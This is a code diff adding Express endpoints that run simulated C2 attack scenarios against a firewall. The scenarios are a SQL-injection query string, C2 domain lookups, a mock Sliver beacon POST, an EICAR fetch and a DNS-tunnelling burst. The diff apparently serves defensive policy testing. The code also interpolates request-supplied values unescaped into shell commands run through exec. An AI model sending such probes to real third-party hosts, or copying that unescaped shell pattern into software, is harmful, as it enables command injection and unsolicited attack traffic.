@@ -6622,7 +6622,192 @@ app.post('/api/security/dns-test-batch', authenticateToken, async (req, res) => 
     res.json({ results });
 });
 
+// =============================================================================
+// API: C2 Attack Scenarios — Individual Test
+// Mirrors the PowerShell security simulation script step by step.
+// POST /api/security/c2-test   { scenarioId, scenarioName, attackType, target }
+// Verdict (inverted from normal tests: blocked = enforced = GOOD for C2):
+//   enforced     → threat blocked/sinkholed ✓
+//   bypass       → threat NOT blocked (policy gap) ⊗
+//   inconclusive → timeout / network error
+// =============================================================================
+app.post('/api/security/c2-test', authenticateToken, async (req, res) => {
+    const { scenarioId, scenarioName, attackType, target } = req.body;
+    if (!scenarioId || !attackType) return res.status(400).json({ error: 'scenarioId and attackType required' });
+
+    const testId = getNextTestId();
+    const execPromise = promisify(exec);
+    const wait = (ms: number) => new Promise(r => setTimeout(r, ms));
+
+    logTest(`[C2-${testId}] Starting scenario: ${scenarioName} (${attackType}) -> ${target}`);
+
+    // ── Helper: nslookup via 8.8.8.8 (mirrors: nslookup <domain> 8.8.8.8) ────
+    const runNslookup = async (domain: string): Promise<{ output: string; resolvedIp: string | null; status: 'enforced' | 'bypass' | 'inconclusive' }> => {
+        try {
+            const { stdout } = await execPromise(`nslookup ${domain} 8.8.8.8`, { timeout: 6000 });
+            const sinkholeIPs = ['198.135.184.22', '72.5.65.111', '::1', '0.0.0.0', '127.0.0.1'];
+            const ipMatch = stdout.match(/Address:\s*([0-9a-f:.]+)/gi);
+            // Skip the first Address: line (it's the server 8.8.8.8)
+            const ips = (ipMatch || []).map((m: string) => m.replace(/Address:\s*/i, '').trim()).filter((ip: string) => ip !== '8.8.8.8');
+            const resolvedIp = ips[0] || null;
+            const combined = stdout.toLowerCase();
+            if (sinkholeIPs.includes(resolvedIp || '') || combined.includes('sinkhole')) {
+                return { output: stdout, resolvedIp, status: 'enforced' }; // sinkholed = blocked = enforced
+            } else if (!resolvedIp || combined.includes('nxdomain') || combined.includes('can\'t find') || combined.includes('servfail')) {
+                return { output: stdout, resolvedIp: null, status: 'enforced' }; // nxdomain = blocked = enforced
+            } else {
+                return { output: stdout, resolvedIp, status: 'bypass' }; // resolved = NOT blocked = bypass
+            }
+        } catch (e: any) {
+            const combinedError = ((e.stdout || '') + (e.stderr || '')).toLowerCase();
+            if (combinedError.includes('sinkhole') || combinedError.includes('nxdomain')) {
+                return { output: e.stdout || e.message, resolvedIp: null, status: 'enforced' };
+            }
+            return { output: e.message, resolvedIp: null, status: 'inconclusive' };
+        }
+    };
+
+    // ── Helper: curl HTTP/HTTPS  ───────────────────────────────────────────────
+    const runCurl = async (url: string, method = 'GET', jsonBody?: string): Promise<{ output: string; httpCode: number; status: 'enforced' | 'bypass' | 'inconclusive' }> => {
+        try {
+            const bodyFlag = jsonBody ? `-X POST -H 'Content-Type: application/json' -d '${jsonBody}'` : '';
+            const cmd = `curl -s -o /dev/null -w '%{http_code}' --max-time 5 ${bodyFlag} "${url}"`;
+            const { stdout } = await execPromise(cmd, { timeout: 8000 });
+            const code = parseInt(stdout.trim()) || 0;
+            // Blocked = 403, 0 (connection refused/reset), 000 (curl couldn't connect)
+            const isBlocked = code === 403 || code === 0 || code === 400;
+            return { output: `HTTP ${code}`, httpCode: code, status: isBlocked ? 'enforced' : 'bypass' };
+        } catch (e: any) {
+            // Connection refused / reset = firewall blocked = enforced
+            if (e.message?.includes('Connection refused') || e.message?.includes('reset') || e.code === 'ETIMEDOUT') {
+                return { output: e.message, httpCode: 0, status: 'enforced' };
+            }
+            return { output: e.message, httpCode: 0, status: 'inconclusive' };
+        }
+    };
+
+    try {
+        let verdictStatus: 'enforced' | 'bypass' | 'inconclusive' = 'inconclusive';
+        let details: any = {};
+
+        switch (attackType) {
+            // 1. SQL Injection → curl GET
+            case 'http_payload': {
+                const r = await runCurl(`http://www.google.com/?id=1' OR '1'='1`);
+                verdictStatus = r.status;
+                details = { url: `http://www.google.com/?id=1' OR '1'='1`, http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'Connection blocked/reset by firewall (Vulnerability Protection)' : `HTTP ${r.httpCode} — payload passed through` };
+                break;
+            }
+            // 2/3/4. DNS C2 → nslookup via 8.8.8.8 + HTTP probe
+            case 'dns_c2': {
+                const domain = target;
+                const dns = await runNslookup(domain);
+                // Also fire an HTTP probe like the PS script (Invoke-WebRequest)
+                let httpCode = 0;
+                try {
+                    const hr = await runCurl(`http://${domain}`);
+                    httpCode = hr.httpCode;
+                } catch {}
+                verdictStatus = dns.status;
+                details = { domain, dns_ip: dns.resolvedIp, resolved_count: dns.resolvedIp ? 1 : 0, http_code: httpCode, output: dns.output, verdict_reason: dns.status === 'enforced' ? `DNS blocked/sinkholed (IP: ${dns.resolvedIp || 'NXDOMAIN'})` : `DNS resolved to ${dns.resolvedIp} — C2 NOT blocked` };
+                break;
+            }
+            // 5. Sliver C2 → curl POST JSON beacon
+            case 'http_c2_beacon': {
+                const sessionId = `sl-${Math.floor(Math.random() * 999999)}`;
+                const body = JSON.stringify({ session_id: sessionId, data: 'c2xpdmVyLWJlYWNvbi10ZXN0' }).replace(/"/g, '\\"');
+                const r = await runCurl('http://example.com/api/v1/session', 'POST', body);
+                verdictStatus = r.status;
+                details = { url: 'http://example.com/api/v1/session', http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'C2 beacon blocked/reset by firewall' : `HTTP ${r.httpCode} — C2 beacon NOT blocked` };
+                break;
+            }
+            // 6. EICAR over HTTPS
+            case 'eicar_https': {
+                const r = await runCurl('https://secure.eicar.org/eicar.com.txt');
+                verdictStatus = r.status;
+                details = { url: 'https://secure.eicar.org/eicar.com.txt', http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'EICAR payload blocked by Threat Prevention (SSL inspection)' : `HTTP ${r.httpCode} — EICAR NOT blocked` };
+                break;
+            }
+            // 7. DNS Tunneling Burst → 15x nslookup with random subdomains
+            case 'dns_tunneling': {
+                const chars = 'abcdefghijklmnopqrstuvwxyz';
+                const rndStr = (n: number) => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+                let enforcedCount = 0;
+                let bypassCount = 0;
+                const outputs: string[] = [];
+                for (let i = 0; i < 15; i++) {
+                    const sub = `${rndStr(32)}.tunnel-demo.com`;
+                    const r = await runNslookup(sub);
+                    if (r.status === 'enforced') enforcedCount++;
+                    else if (r.status === 'bypass') bypassCount++;
+                    outputs.push(`[${i + 1}] ${sub}: ${r.status} (${r.resolvedIp || 'NXDOMAIN'})`);
+                    await wait(100);
+                }
+                // All 15 must be blocked to be fully enforced
+                verdictStatus = bypassCount === 0 ? 'enforced' : bypassCount >= 15 ? 'bypass' : 'bypass';
+                details = { domain: '*.tunnel-demo.com', resolved_count: bypassCount, dns_ip: null, output: outputs.join('\n'), verdict_reason: `${enforcedCount}/15 queries blocked, ${bypassCount}/15 bypassed` };
+                break;
+            }
+            default:
+                verdictStatus = 'inconclusive';
+                details = { output: `Unknown attack_type: ${attackType}` };
+        }
+
+        const result = {
+            success: true,
+            status: verdictStatus,
+            scenarioId,
+            scenarioName,
+            attackType,
+            target,
+            ...details
+        };
+
+        logTest(`[C2-${testId}] Result: ${verdictStatus} - ${scenarioName}`);
+        const { previousStatus } = await addTestResult('c2_scenario', scenarioName, result, testId, details);
+        res.json({ ...result, testId, previousStatus });
+
+    } catch (e: any) {
+        logTest(`[C2-${testId}] Unexpected error: ${e.message}`);
+        res.status(500).json({ error: 'C2 test failed', detail: e.message });
+    }
+});
+
+// =============================================================================
+// API: C2 Attack Scenarios — Batch Run
+// POST /api/security/c2-test-batch  { scenarios: [{ scenarioId, scenarioName, attackType, target }] }
+// =============================================================================
+app.post('/api/security/c2-test-batch', authenticateToken, async (req, res) => {
+    const { scenarios } = req.body;
+    if (!Array.isArray(scenarios) || scenarios.length === 0) {
+        return res.status(400).json({ error: 'scenarios array required' });
+    }
+
+    logTest(`[C2-BATCH] Starting batch of ${scenarios.length} C2 scenarios`);
+    res.json({ success: true, message: `Batch of ${scenarios.length} C2 scenarios started` });
+
+    // Fire-and-forget — run each scenario sequentially in the background
+    // We call the same internal logic as the individual test route, using internal fetch
+    (async () => {
+        for (const s of scenarios) {
+            try {
+                const token = (req as any).token || req.headers.authorization?.split(' ')[1] || '';
+                await fetch(`http://localhost:${PORT}/api/security/c2-test`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+                    body: JSON.stringify(s)
+                });
+            } catch (e: any) {
+                logTest(`[C2-BATCH] Error running scenario ${s.scenarioId}: ${e.message}`);
+            }
+            await new Promise(r => setTimeout(r, 600)); // 600ms between tests to avoid firewall flood protection
+        }
+        logTest(`[C2-BATCH] All ${scenarios.length} scenarios completed`);
+    })();
+});
+
 // --- API: SCORE TRACKING ---
+
 
 app.get('/api/security/scores', authenticateToken, (req, res) => {
     const history = getLatestScoreHistory();
